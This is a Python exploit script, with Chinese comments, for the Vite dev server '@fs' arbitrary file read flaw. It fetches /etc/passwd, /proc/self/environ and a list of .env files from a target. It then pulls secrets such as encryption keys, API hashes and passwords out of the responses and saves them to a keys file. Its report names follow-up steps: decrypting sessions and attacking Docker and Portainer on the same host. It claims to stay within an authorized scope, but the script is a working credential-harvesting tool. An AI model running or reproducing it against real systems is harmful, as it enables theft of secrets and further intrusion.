#!/usr/bin/env python3
"""Vite / 开发服 @fs 任意读探针（授权范围内）。只读敏感路径，不写盘到目标。"""
from __future__ import annotations

import argparse
import json
import re
import sys
from datetime import datetime, UTC
from pathlib import Path
from typing import Any
from urllib.parse import quote

try:
    import requests

    requests.packages.urllib3.disable_warnings()  # type: ignore
except ImportError:
    print("[!] pip install requests", file=sys.stderr)
    sys.exit(1)

OPS = Path(__file__).resolve().parent
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))
from scope_lib import ENGINE, host_of, in_scope, write_probe_json  # noqa: E402

UA = "Mozilla/5.0 大爱仙尊-vite-fs"
CANDIDATES = (
    "/etc/passwd",
    "/etc/hostname",
    "/app/package.json",
    "/app/.env",
    "/app/.env.local",
    "/app/.env.production",
    "/app/backend/.env",
    "/app/server/.env",
    "/usr/src/app/.env",
    "/home/node/app/.env",
    "/var/www/.env",
    "/proc/self/environ",
)
KEY_RX = re.compile(
    r"(?i)(ENCRYPTION_KEY|SECRET_KEY|FERNET_KEY|API_HASH|API_ID|"
    r"SESSION_KEY|TELEGRAM_API_HASH|PASSWORD)\s*[=:]\s*([^\s\"']+)"
)


def _get(sess: requests.Session, url: str) -> requests.Response | None:
    try:
        return sess.get(url, timeout=10, verify=False, allow_redirects=False)
    except Exception:
        return None


def _body_text(r: requests.Response) -> str:
    # environ 等可能是 latin1 / 含 \0
    raw = r.content or b""
    if b"\x00" in raw[:200]:
        return raw.replace(b"\x00", b"\n").decode("latin1", errors="replace")
    try:
        return r.text or raw.decode("utf-8", errors="replace")
    except Exception:
        return raw.decode("latin1", errors="replace")


def run(base_url: str, case: str, out: Path | None, extra: list[str]) -> dict[str, Any]:
    host = host_of(base_url)
    if host and not in_scope(host):
        print(f"[!] 不在 scope：{host}", file=sys.stderr)
        sys.exit(2)
    base = base_url.rstrip("/")
    sess = requests.Session()
    sess.headers["User-Agent"] = UA

    hits: list[dict[str, Any]] = []
    key_hints: list[str] = []
    seen_paths: set[str] = set()

    for path in list(CANDIDATES) + extra:
        if path in seen_paths:
            continue
        seen_paths.add(path)
        abs_path = path if path.startswith("/") else "/" + path
        urls = [
            f"{base}/@fs{abs_path}",
            f"{base}/@fs{quote(abs_path, safe='/')}",
        ]
        # 去重 URL
        tried: set[str] = set()
        for u in urls:
            if u in tried:
                continue
            tried.add(u)
            r = _get(sess, u)
            if r is None or r.status_code != 200:
                continue
            body = _body_text(r)
            if len(body) < 3:
                continue
            # 排除 SPA 回退 HTML
            head = body.lstrip()[:200].lower()
            if head.startswith("<!doctype html") or head.startswith("<html"):
                if "root:x:" not in body and "ENCRYPTION" not in body and '"name"' not in body[:80]:
                    continue
            # package.json 指纹
            if abs_path.endswith("package.json") and '"name"' not in body:
                continue
            if abs_path.endswith("passwd") and "root:" not in body:
                continue
            row = {
                "url": u,
                "path": abs_path,
                "status": r.status_code,
                "len": len(body),
                "snippet": body[:300],
            }
            hits.append(row)
            print(f"  [+] {abs_path} len={len(body)}")
            for m in KEY_RX.finditer(body):
                key_hints.append(f"{m.group(1)}={m.group(2)[:120]}")
            break

    keys_out = None
    if key_hints and case:
        kd = ENGINE / "案卷" / case / "测绘" / "vite_fs"
        kd.mkdir(parents=True, exist_ok=True)
        keys_out = kd / "keys_from_fs.env"
        # 写成 KEY=value 供 fernet 直接吃
        lines = []
        for h in key_hints:
            if "=" in h:
                lines.append(h)
        keys_out.write_text("\n".join(dict.fromkeys(lines)) + "\n", encoding="utf-8")
        print(f"  [*] wrote keys → {keys_out}")

    report = {
        "target": base_url,
        "ts": datetime.now(UTC).isoformat(),
        "hits": hits,
        "key_hints": key_hints[:50],
        "keys_file": str(keys_out) if keys_out else "",
        "playbook": "传承/快读·开卷.md",
        "skill": "杀招/快读",
        "next": [
            "命中 .env → python3 炼蛊房/fernet_session_decrypt.py decrypt --keys-file <keys_from_fs.env>",
            "命中后端挂载路径 → 继续 --extra /path",
            "同主机 Docker/Portainer/WolfStack 并行",
        ],
    }
    out_path = write_probe_json(
        report, case=case, out=out, case_subdir="vite_fs", filename="probe.json"
    )
    print(
        json.dumps(
            {"hits": len(hits), "key_hints": len(key_hints), "out": str(out_path)},
            ensure_ascii=False,
        )
    )
    return report


def main() -> None:
    ap = argparse.ArgumentParser(description="Vite @fs 任意读探针")
    ap.add_argument("-u", "--url", required=True)
    ap.add_argument("--case", default="")
    ap.add_argument("--out", type=Path, default=None)
    ap.add_argument("--extra", action="append", default=[], help="额外绝对路径")
    args = ap.parse_args()
    run(args.url, args.case, args.out, args.extra)


if __name__ == "__main__":
    main()
